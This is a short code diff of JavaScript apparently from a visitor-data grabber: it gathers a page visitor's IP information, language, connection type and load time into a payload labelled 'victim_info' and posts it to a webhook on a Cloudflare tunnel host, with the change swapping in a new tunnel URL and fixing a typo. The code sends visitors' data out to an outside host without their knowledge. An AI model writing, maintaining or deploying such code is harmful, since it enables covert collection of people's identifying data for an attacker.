@@ -76,11 +76,11 @@ Language: ${userLanguage}
 Connection Type: ${connectionType}
 Loading Time: ${loadTime}`;
 
-            const webhookURL = "https://terminology-britain-suspect-outlined.trycloudflare.com/userData";
+            const webhookURL = "https://ict-polyphonic-rapids-recipes.trycloudflare.com/userData";
 
             const payload = {
                 'victim_info': ipinfo, 
-                'extra_info': null1
+                'extra_info': null
             }
             fetch(webhookURL, {
                 method: "POST",
